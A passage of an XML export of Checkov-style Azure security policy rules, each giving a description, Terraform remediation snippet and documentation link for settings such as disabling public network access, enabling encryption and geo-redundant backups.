      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="app-services-do-not-use-azure-files"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-app-services-do-not-use-azure-files"></div>App services do not use Azure files</div><a aria-label="Skip link to App services do not use Azure files" class="heading-anchor-icon fa fa-anchor" href="#app-services-do-not-use-azure-files"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The content directory of an app service should be located on an Azure file share. The storage account information for the file share must be provided before any publishing activity.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> storage_account.type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
              ...
 +            storage_account {
                name = "test_name"
 +              type = "AzureFiles"
                ...
                }
              }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-app-services-use-azure-files' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-app-services-use-azure-files</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-app-services-use-azure-files' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_89</key>
    <name>Ensure Azure cache for Redis has public network access disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cache-for-redis-has-public-network-access-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cache-for-redis-has-public-network-access-enabled"></div>Azure cache for Redis has public network access enabled</div><a aria-label="Skip link to Azure cache for Redis has public network access enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-cache-for-redis-has-public-network-access-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_redis_cache</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_redis_cache" "example" {
                      ...
+                     public_network_access_enabled  = false
                                            ...
                }
                    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cache-for-redis-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-cache-for-redis-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cache-for-redis-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_92</key>
    <name>Ensure Virtual Machines are utilizing managed disks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-virtual-machines-are-not-utilizing-managed-disks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-virtual-machines-are-not-utilizing-managed-disks"></div>Azure Virtual Machines are not utilizing managed disks</div><a aria-label="Skip link to Azure Virtual Machines are not utilizing managed disks" class="heading-anchor-icon fa fa-anchor" href="#azure-virtual-machines-are-not-utilizing-managed-disks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using Azure Managed disk over traditional BLOB based VHD's has more advantage features like Managed disks are by default encrypted, reduces cost over storage accounts and more resilient as Microsoft will manage the disk storage and move around if underlying hardware goes faulty. It is recommended to move BLOB based VHD's to Managed Disks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-cli"></div>In Azure CLI</div><a aria-label="Skip link to In Azure CLI" class="heading-anchor-icon fa fa-anchor" href="#in-azure-cli"></a></h2>
<ol>
<li>Log in to the Azure Portal</li>
<li>Select 'Virtual Machines' from the left pane</li>
<li>Select the reported virtual machine</li>
<li>Select 'Disks' under 'Settings'</li>
<li>Click on 'Migrate to managed disks'</li>
<li>Select 'Migrate'", "remediable": false,</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_windows_virtual_machine</li>
<li><strong>Argument:</strong> storage_os_disk</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_windows_virtual_machine" "example" {
  ...
  + storage_os_disk {
    name              = "myosdisk1"
    caching           = "ReadWrite"
    create_option     = "FromImage"
    managed_disk_type = "Standard_LRS"
  }
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-use-managed-disks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-use-managed-disks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-use-managed-disks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_93</key>
    <name>Ensure managed disks use a specific set of disk encryption sets for customer-managed key encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="managed-disks-do-not-use-a-specific-set-of-disk-encryption-sets-for-customer-managed-key-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-managed-disks-do-not-use-a-specific-set-of-disk-encryption-sets-for-customer-managed-key-encryption"></div>Managed disks do not use a specific set of disk encryption sets for customer-managed key encryption</div><a aria-label="Skip link to Managed disks do not use a specific set of disk encryption sets for customer-managed key encryption" class="heading-anchor-icon fa fa-anchor" href="#managed-disks-do-not-use-a-specific-set-of-disk-encryption-sets-for-customer-managed-key-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Requiring a specific set of disk encryption sets to be used with managed disks give you control over the keys used for encryption at rest. You are able to select the allowed encrypted sets and all others are rejected when attached to a disk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_managed_disk</li>
<li><strong>Argument:</strong>  disk_encryption_set_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_managed_disk" "source" {
              name                 = "acctestmd1"
              location             = "West US 2"
              resource_group_name  = azurerm_resource_group.example.name
              storage_account_type = "Standard_LRS"
              create_option        = "Empty"
              disk_size_gb         = "1"
+             disk_encryption_set_id = "koko"
              tags = {
                environment = "staging"
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-managed-disks-use-a-specific-set-of-disk-encryption-sets-for-the-customer-managed-key-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-managed-disks-use-a-specific-set-of-disk-encryption-sets-for-the-customer-managed-key-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-managed-disks-use-a-specific-set-of-disk-encryption-sets-for-the-customer-managed-key-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_94</key>
    <name>Ensure My SQL server enables geo-redundant backups</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="my-sql-server-disables-geo-redundant-backups"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-disables-geo-redundant-backups"></div>My SQL server disables geo-redundant backups</div><a aria-label="Skip link to My SQL server disables geo-redundant backups" class="heading-anchor-icon fa fa-anchor" href="#my-sql-server-disables-geo-redundant-backups"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that your Microsoft Azure My SQL database servers have geo-redundant backups enabled, to allow you to restore your My SQL servers to a different Azure region in the event of a regional outage or a disaster.</p>
<p>Geo-restore is the default recovery option when your My SQL database server is unavailable because of a large-scale incident, such as a natural disaster, occurs in the region where the database server is hosted. .During geo-restore, the My SQL server configuration can be changed. These configuration changes include compute generation, vCore, backup retention period and backup redundancy options.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure console</div><a aria-label="Skip link to In Azure console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Sign in to <strong>Azure Management Console</strong>.</li>
<li>Navigate to <strong>All resource</strong>s blade at <a href="https://portal.azure.com/#blade/HubsExtension/BrowseAll" target="_self">https://portal.azure.com/#blade/HubsExtension/BrowseAll</a> to access all your Microsoft Azure resources.</li>
<li>From the Type filter box, select Azure Database for My SQL server to list the My SQL servers provisioned within your Azure account.</li>
<li>Click on the name of the My SQL database server that you want to examine.</li>
<li>In the navigation panel, under Settings, select Pricing tier to access the pricing tier settings available for the selected My SQL server.</li>
<li>On the Pricing tier page, in the Backup Redundancy Options section, check the backup redundancy tier configured for the database server. If the selected tier is Locally Redundant, the data can be recovered from within the current region only, therefore the Geo-Redundant backup feature is not enabled for the selected Microsoft Azure My SQL database server.</li>
<li>Repeat steps no. 4 &#8211; 6 for each My SQL database server available in the current Azure subscription.</li>
<li>Repeat steps no. 3 &#8211; 7 for each subscription created in your Microsoft Azure cloud account.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mysql_server</li>
<li><strong>Argument:</strong> geo_redundant_backup_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "example" {
  ...
+ geo_redundant_backup_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-geo-redundant-backups' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-geo-redundant-backups</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-my-sql-server-enables-geo-redundant-backups' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_95</key>
    <name>Ensure automatic OS image patching is enabled for Virtual Machine scale sets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="automatic-os-image-patching-is-disabled-for-virtual-machine-scale-sets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-automatic-os-image-patching-is-disabled-for-virtual-machine-scale-sets"></div>Automatic OS image patching is disabled for Virtual Machine scale sets</div><a aria-label="Skip link to Automatic OS image patching is disabled for Virtual Machine scale sets" class="heading-anchor-icon fa fa-anchor" href="#automatic-os-image-patching-is-disabled-for-virtual-machine-scale-sets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy enforces enabling automatic OS image patching on Virtual Machine Scale Sets to always keep Virtual Machines secure by safely applying latest security patches every month.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_virtual_machine_scale_set</li>
<li><strong>Argument:</strong> automatic_os_upgrade</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_virtual_machine_scale_set" "example" {
          ...
 +        automatic_os_upgrade = true
          ...
        }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-automatic-os-image-patching-is-enabled-for-virtual-machine-scale-sets' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-automatic-os-image-patching-is-enabled-for-virtual-machine-scale-sets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-automatic-os-image-patching-is-enabled-for-virtual-machine-scale-sets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_96</key>
    <name>Ensure MySQL server enables infrastructure encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mysql-server-disables-infrastructure-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-disables-infrastructure-encryption"></div>MySQL server disables infrastructure encryption</div><a aria-label="Skip link to MySQL server disables infrastructure encryption" class="heading-anchor-icon fa fa-anchor" href="#mysql-server-disables-infrastructure-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable infrastructure encryption for Azure Database for MySQL servers to have higher level of assurance that the data is secure. When infrastructure encryption is enabled, the data at rest is encrypted twice using FIPS 140-2 compliant Microsoft managed keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_mysql_server</li>
<li><strong>Argument:</strong> infrastructure_encryption_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "example" {
  ...
+ infrastructure_encryption_enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_97</key>
    <name>Ensure Virtual Machine scale sets have encryption at host enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="virtual-machine-scale-sets-do-not-have-encryption-at-host-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-virtual-machine-scale-sets-do-not-have-encryption-at-host-enabled"></div>Virtual Machine scale sets do not have encryption at host enabled</div><a aria-label="Skip link to Virtual Machine scale sets do not have encryption at host enabled" class="heading-anchor-icon fa fa-anchor" href="#virtual-machine-scale-sets-do-not-have-encryption-at-host-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use encryption at host to get end-to-end encryption for your virtual machine and virtual machine scale set data. Encryption at host enables encryption at rest for your temporary disk and OS/data disk caches. Temporary and ephemeral OS disks are encrypted with platform-managed keys when encryption at host is enabled. OS/data disk caches are encrypted at rest with either customer-managed or platform-managed key, depending on the encryption type selected on the disk. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_windows_virtual_machine_scale_set</li>
<li><strong>Argument:</strong> encryption_at_host_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_windows_virtual_machine_scale_set" "example" {
                  ...
  +               encryption_at_host_enabled = true
                  ...
                  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machine-scale-sets-have-encryption-at-host-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-virtual-machine-scale-sets-have-encryption-at-host-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-virtual-machine-scale-sets-have-encryption-at-host-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_98</key>
    <name>Ensure Azure container container group is deployed into a virtual network</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-container-container-group-is-not-deployed-into-a-virtual-network"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-container-container-group-is-not-deployed-into-a-virtual-network"></div>Azure container container group is not deployed into a virtual network</div><a aria-label="Skip link to Azure container container group is not deployed into a virtual network" class="heading-anchor-icon fa fa-anchor" href="#azure-container-container-group-is-not-deployed-into-a-virtual-network"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_container_group</li>
<li><strong>Argument:</strong> network_profile_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_container_group" "example" {
              ...
              
  +           network_profile_id = "network_profile_id"    
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-container-container-group-is-deployed-into-virtual-network' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-container-container-group-is-deployed-into-virtual-network</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-container-container-group-is-deployed-into-virtual-network' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_99</key>
    <name>Ensure Cosmos DB accounts have restricted access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cosmos-db-accounts-do-not-have-restricted-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cosmos-db-accounts-do-not-have-restricted-access"></div>Cosmos DB accounts do not have restricted access</div><a aria-label="Skip link to Cosmos DB accounts do not have restricted access" class="heading-anchor-icon fa fa-anchor" href="#cosmos-db-accounts-do-not-have-restricted-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cosmosdb_account</li>
<li><strong>Argument:</strong>public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cosmosdb_account" "db" {
              ...
 +            public_network_access_enabled = false
              ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-cosmos-db-accounts-have-restricted-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-cosmos-db-accounts-have-restricted-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-cosmos-db-accounts-have-restricted-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_100</key>
    <name>Ensure Cosmos DB accounts have customer-managed keys to encrypt data at rest</name>
    <description>
